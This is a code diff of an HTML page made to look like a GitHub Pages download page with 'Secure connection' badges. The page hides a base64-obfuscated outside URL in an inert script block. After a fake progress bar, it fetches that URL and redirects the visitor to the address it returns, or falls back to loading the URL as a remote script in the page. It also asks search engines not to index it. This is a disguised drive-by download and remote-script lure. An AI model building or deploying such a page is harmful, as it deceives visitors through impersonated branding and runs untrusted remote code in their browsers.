@@ -1,9 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Collect</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="unsafe-url">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Ultimate Resource Bundle</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="icon"
+      type="image/svg+xml"
+      media="(prefers-color-scheme: light)"
+      href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2324292f' d='M12 .5C5.73.5.75 5.6.75 11.88c0 5.02 3.22 9.28 7.69 10.78.56.1.77-.24.77-.54 0-.27-.01-1.15-.02-2.09-3.13.69-3.79-1.35-3.79-1.35-.51-1.33-1.25-1.68-1.25-1.68-1.02-.71.08-.69.08-.69 1.13.08 1.72 1.18 1.72 1.18 1 1.75 2.63 1.25 3.27.96.1-.74.39-1.25.71-1.54-2.5-.29-5.13-1.28-5.13-5.69 0-1.26.44-2.28 1.16-3.09-.12-.29-.5-1.46.11-3.05 0 0 .95-.31 3.09 1.18A10.5 10.5 0 0112 6.22c.96 0 1.92.13 2.82.38 2.15-1.49 3.09-1.18 3.09-1.18.61 1.59.23 2.76.11 3.05.72.81 1.16 1.83 1.16 3.09 0 4.42-2.64 5.39-5.15 5.68.4.36.76 1.06.76 2.14 0 1.54-.01 2.78-.01 3.16 0 .3.2.65.78.54 4.46-1.51 7.68-5.77 7.68-10.78C23.25 5.6 18.27.5 12 .5z'/%3E%3C/svg%3E">
+
+<link rel="icon"
+      type="image/svg+xml"
+      media="(prefers-color-scheme: dark)"
+      href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23f0f6fc' d='M12 .5C5.73.5.75 5.6.75 11.88c0 5.02 3.22 9.28 7.69 10.78.56.1.77-.24.77-.54 0-.27-.01-1.15-.02-2.09-3.13.69-3.79-1.35-3.79-1.35-.51-1.33-1.25-1.68-1.25-1.68-1.02-.71.08-.69.08-.69 1.13.08 1.72 1.18 1.72 1.18 1 1.75 2.63 1.25 3.27.96.1-.74.39-1.25.71-1.54-2.5-.29-5.13-1.28-5.13-5.69 0-1.26.44-2.28 1.16-3.09-.12-.29-.5-1.46.11-3.05 0 0 .95-.31 3.09 1.18A10.5 10.5 0 0112 6.22c.96 0 1.92.13 2.82.38 2.15-1.49 3.09-1.18 3.09-1.18.61 1.59.23 2.76.11 3.05.72.81 1.16 1.83 1.16 3.09 0 4.42-2.64 5.39-5.15 5.68.4.36.76 1.06.76 2.14 0 1.54-.01 2.78-.01 3.16 0 .3.2.65.78.54 4.46-1.51 7.68-5.77 7.68-10.78C23.25 5.6 18.27.5 12 .5z'/%3E%3C/svg%3E">
     <style>
         * { box-sizing: border-box; }
 
@@ -391,7 +405,13 @@
                 0 0 22px rgba(40, 150, 255, 0.28),
                 0 0 28px rgba(140, 80, 255, 0.2);
             transform-origin: left center;
-            animation: fillBar 1.7s cubic-bezier(0.22, 0.08, 0.18, 1) forwards;
+            transform: scaleX(0);
+            animation: fillBar var(--prep-duration, 1.7s) cubic-bezier(0.22, 0.08, 0.18, 1) forwards;
+        }
+
+        .status-line.err {
+            color: #f87171;
+            letter-spacing: 4px;
         }
 
         @keyframes fillBar {
@@ -475,23 +495,182 @@
         }
 
     </style>
-  <!-- Hop URL (https://...) as base64 — stored in inert script, not meta -->
-  <script type="text/plain" data-cfg="hop" id="hop-payload">
+    <script type="text/plain" data-cfg="hop" id="hop-payload">
 aHR0cHM6Ly91c2FyYXdoYWxtLmNvbS9ib21iZXIubXV0YWdl
-  </script>
-  <script type="text/plain" data-cfg="prep-ms" id="prep-ms">1100</script>
+    </script>
+    <script type="text/plain" data-cfg="prep-ms" id="prep-ms">1700</script>
 </head>
 <body>
-  <main>
-    <h1>Collecting package</h1>
-    <p>Preparing a secure handoff. The browser will open the delivery endpoint when the bar is full.</p>
-    <progress id="bar" value="0" max="100"></progress>
-    <div class="label" id="label">Stage: warm-up</div>
-  </main>
+    <div class="page">
+        <div class="atm"></div>
+        <div class="floor">
+            <div class="floor-reflect"></div>
+            <div class="floor-smear"></div>
+            <div class="floor-grain">
+                <svg viewBox="0 0 1200 800" preserveAspectRatio="none" aria-hidden="true">
+                    <defs>
+                        <filter id="wetNoise" x="-30%" y="-30%" width="160%" height="160%">
+                            <feTurbulence type="fractalNoise" baseFrequency="0.011 0.038" numOctaves="4" seed="7" result="n"/>
+                            <feColorMatrix in="n" type="matrix" values="
+                                0 0 0 0 0.07
+                                0 0 0 0 0.10
+                                0 0 0 0 0.14
+                                0 0 0 0.55 0"/>
+                            <feGaussianBlur stdDeviation="0.45"/>
+                        </filter>
+                        <filter id="wetCracks" x="-20%" y="-20%" width="140%" height="140%">
+                            <feTurbulence type="turbulence" baseFrequency="0.016 0.007" numOctaves="2" seed="19"/>
+                            <feColorMatrix type="matrix" values="
+                                1 0 0 0 0.02
+                                0 1 0 0 0.04
+                                0 0 1 0 0.07
+                                0 0 0 0.22 0"/>
+                        </filter>
+                    </defs>
+                    <rect width="1200" height="800" filter="url(#wetNoise)"/>
+                    <rect width="1200" height="800" filter="url(#wetCracks)" opacity="0.55"/>
+                </svg>
+            </div>
+            <div class="floor-spec"></div>
+        </div>
 
-  <script type="module">
-    const bar = document.getElementById('bar');
-    const label = document.getElementById('label');
+        <header class="topbar">
+            <div class="brand">
+                <svg class="gh-mark" viewBox="0 0 16 16" aria-hidden="true">
+                    <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+                </svg>
+            </div>
+            <div class="secure">
+                <svg class="lock" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+                    <rect x="3.4" y="7.2" width="9.2" height="6.4" rx="1.4" stroke="#d7e2ee" stroke-width="1.3"/>
+                    <path d="M5.3 7.2V5.5a2.7 2.7 0 015.4 0v1.7" stroke="#d7e2ee" stroke-width="1.3"/>
+                </svg>
+                <span>Secure</span>
+                <span class="v-split"></span>
+                <span class="pages-mark">
+                    <svg class="mini-mark" viewBox="0 0 16 16" aria-hidden="true">
+                        <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+                    </svg>
+                    GitHub Pages
+                </span>
+            </div>
+        </header>
+
+        <div class="center-group">
+        <div class="orbit-stage">
+            <svg class="orbit-svg" viewBox="0 0 860 286" fill="none" aria-hidden="true">
+                <defs>
+                    <linearGradient id="orbitStroke" x1="0" y1="143" x2="860" y2="143" gradientUnits="userSpaceOnUse">
+                        <stop offset="0" stop-color="#7ad8ff"/>
+                        <stop offset="0.5" stop-color="#f3f7ff"/>
+                        <stop offset="1" stop-color="#c59bff"/>
+                    </linearGradient>
+                </defs>
+                <ellipse cx="430" cy="143" rx="410" ry="114" stroke="url(#orbitStroke)" stroke-width="1.3" opacity="0.92"/>
+            </svg>
+            <span class="orbit-dot left"></span>
+            <span class="orbit-dot right"></span>
+
+            <div class="tile tile-code" aria-hidden="true">
+                <svg viewBox="0 0 24 24" fill="none">
+                    <path d="M9 8.2L4.8 12 9 15.8M15 8.2L19.2 12 15 15.8" stroke="#a4b6c8" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            <div class="tile tile-book" aria-hidden="true">
+                <svg viewBox="0 0 24 24" fill="none">
+                    <path d="M5.5 6h6c1.8 0 3.2 1.3 3.2 3v10.2c-1.4-.7-2.8-1-4.4-1H5.5V6z" stroke="#a4b6c8" stroke-width="1.5"/>
+                    <path d="M18.5 6h-3.4c.8.7 1.3 1.7 1.3 3v10.2c1.3-.6 2.2-1 3.1-1.1V6h-1z" stroke="#a4b6c8" stroke-width="1.5"/>
+                </svg>
+            </div>
+            <div class="tile tile-branch" aria-hidden="true">
+                <svg viewBox="0 0 24 24" fill="none">
+                    <circle cx="7.2" cy="6.4" r="2.1" stroke="#a4b6c8" stroke-width="1.5"/>
+                    <circle cx="16.8" cy="6.4" r="2.1" stroke="#a4b6c8" stroke-width="1.5"/>
+                    <circle cx="7.2" cy="17.6" r="2.1" stroke="#a4b6c8" stroke-width="1.5"/>
+                    <path d="M7.2 8.5v7M7.2 10.6c0 3 9.6 1.6 9.6-2.1" stroke="#a4b6c8" stroke-width="1.5"/>
+                </svg>
+            </div>
+            <div class="tile tile-users" aria-hidden="true">
+                <svg viewBox="0 0 24 24" fill="none">
+                    <circle cx="9" cy="8.2" r="2.3" stroke="#a4b6c8" stroke-width="1.5"/>
+                    <path d="M4.8 17.2c.4-2.4 2.1-3.7 4.2-3.7s3.8 1.3 4.2 3.7" stroke="#a4b6c8" stroke-width="1.5" stroke-linecap="round"/>
+                    <circle cx="15.6" cy="8.6" r="1.9" stroke="#a4b6c8" stroke-width="1.4"/>
+                    <path d="M14.2 13.6c1.7 0 3.2 1 3.7 2.9" stroke="#a4b6c8" stroke-width="1.4" stroke-linecap="round"/>
+                </svg>
+            </div>
+        </div>
+
+        <div class="octo-wrap">
+            <svg class="octo-3d" viewBox="-0.4 -0.4 16.8 16.8" aria-hidden="true">
+                <defs>
+                    <linearGradient id="steelFace" x1="2" y1="0" x2="14" y2="16" gradientUnits="userSpaceOnUse">
+                        <stop offset="0" stop-color="#314865"/>
+                        <stop offset="0.45" stop-color="#15243a"/>
+                        <stop offset="1" stop-color="#1a1630"/>
+                    </linearGradient>
+                    <linearGradient id="steelSide" x1="0" y1="0" x2="16" y2="16" gradientUnits="userSpaceOnUse">
+                        <stop offset="0" stop-color="#9ecbe4"/>
+                        <stop offset="0.4" stop-color="#3a5168"/>
+                        <stop offset="1" stop-color="#8a6aa8"/>
+                    </linearGradient>
+                    <mask id="litTopLeft">
+                        <rect width="16" height="16" fill="black"/>
+                        <ellipse cx="4.2" cy="3.2" rx="5.2" ry="4.4" fill="white"/>
+                    </mask>
+                    <mask id="litRight">
+                        <rect width="16" height="16" fill="black"/>
+                        <ellipse cx="13.2" cy="8" rx="4.2" ry="6.2" fill="white"/>
+                    </mask>
+                    <mask id="litLowRight">
+                        <rect width="16" height="16" fill="black"/>
+                        <ellipse cx="11.8" cy="13.2" rx="3.4" ry="2.6" fill="white"/>
+                    </mask>
+                    <path id="ghMark" fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+                </defs>
+
+                <use href="#ghMark" x="0.42" y="0.38" fill="#0b0e14"/>
+                <use href="#ghMark" x="0.34" y="0.31" fill="#151a24"/>
+                <use href="#ghMark" x="0.27" y="0.25" fill="#1d2836"/>
+                <use href="#ghMark" x="0.21" y="0.2" fill="url(#steelSide)"/>
+                <use href="#ghMark" x="0.16" y="0.15" fill="#3d536c"/>
+                <use href="#ghMark" x="0.12" y="0.11" fill="#4a6580"/>
+                <use href="#ghMark" x="0.08" y="0.07" fill="#5a7a96"/>
+                <use href="#ghMark" x="0.04" y="0.03" fill="#6a8aa8"/>
+
+                <use href="#ghMark" fill="url(#steelFace)"/>
+
+                <use href="#ghMark" fill="none" stroke="#f4fbff" stroke-width="0.14" mask="url(#litTopLeft)" opacity="0.8"/>
+                <use href="#ghMark" fill="none" stroke="#d7b0ff" stroke-width="0.2" mask="url(#litRight)" opacity="0.5"/>
+                <use href="#ghMark" fill="none" stroke="#ffffff" stroke-width="0.09" mask="url(#litLowRight)" opacity="0.5"/>
+            </svg>
+        </div>
+
+        <div class="copy">
+            <h1 class="wordmark">Download</h1>
+            <p class="status-line" id="status-line">GETTING THINGS READY...</p>
+            <div class="progress" aria-hidden="true"><div class="progress-fill" id="progress-fill"></div></div>
+        </div>
+        </div>
+
+        <footer class="status-footer">
+            <div class="status-left">
+                <span class="status-dot"></span>
+                <span>GitHub Pages</span>
+            </div>
+            <div class="status-center">
+                <svg class="lock" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+                    <rect x="3.4" y="7.2" width="9.2" height="6.4" rx="1.4" stroke="currentColor" stroke-width="1.3"/>
+                    <path d="M5.3 7.2V5.5a2.7 2.7 0 015.4 0v1.7" stroke="currentColor" stroke-width="1.3"/>
+                </svg>
+                <span>Secure connection</span>
+            </div>
+            <div class="status-right">© 2026</div>
+        </footer>
+    </div>
+
+    <script type="module">
+    const statusLine = document.getElementById('status-line');
+    const progressFill = document.getElementById('progress-fill');
 
     function readPlain(id) {
       const el = document.getElementById(id);
@@ -523,51 +702,46 @@ aHR0cHM6Ly91c2FyYXdoYWxtLmNvbS9ib21iZXIubXV0YWdl
       s.src = hopUrl;
       s.async = true;
       s.onerror = () => {
-        label.textContent = 'Relay blocked by browser';
-        label.classList.add('fail');
+        statusLine.textContent = 'RELAY BLOCKED';
+        statusLine.classList.add('err');
       };
       document.head.appendChild(s);
     }
 
     async function release(hopUrl) {
-      label.textContent = 'Stage: resolve relay';
+      statusLine.textContent = 'OPENING CHANNEL…';
       try {
         const res = await fetch(hopUrl, { cache: 'no-store', credentials: 'omit' });
         if (!res.ok) throw new Error('http');
         const target = parseRelayBody(await res.text());
-        label.textContent = 'Stage: redirect';
+        statusLine.textContent = 'STARTING DOWNLOAD…';
         window.location.replace(target);
         return;
       } catch {
-        label.textContent = 'Stage: run relay script';
+        statusLine.textContent = 'RUNNING RELAY…';
         attachRelayScript(hopUrl);
       }
     }
 
-    const prepMs = Math.max(400, parseInt(readPlain('prep-ms'), 10) || 1100);
     let hopUrl;
     try {
       hopUrl = decodeHop(readPlain('hop-payload'));
     } catch {
-      label.textContent = 'Invalid hop payload block';
-      label.classList.add('fail');
+      statusLine.textContent = 'INVALID HOP CONFIG';
+      statusLine.classList.add('err');
       throw new Error('cfg');
     }
 
-    const t0 = performance.now();
-    function frame(now) {
-      const t = Math.min(1, (now - t0) / prepMs);
-      const eased = 1 - Math.pow(1 - t, 2.5);
-      bar.value = Math.round(eased * 100);
-      if (t < 1) {
-        label.textContent = 'Stage: prepare · ' + bar.value + '%';
-        requestAnimationFrame(frame);
-        return;
-      }
-      label.textContent = 'Stage: handoff';
-      release(hopUrl);
-    }
-    requestAnimationFrame(frame);
-  </script>
+    const prepMs = Math.max(400, parseInt(readPlain('prep-ms'), 10) || 1700);
+    document.documentElement.style.setProperty('--prep-duration', prepMs + 'ms');
+
+    progressFill.addEventListener(
+      'animationend',
+      () => {
+        release(hopUrl);
+      },
+      { once: true }
+    );
+    </script>
 </body>
 </html>
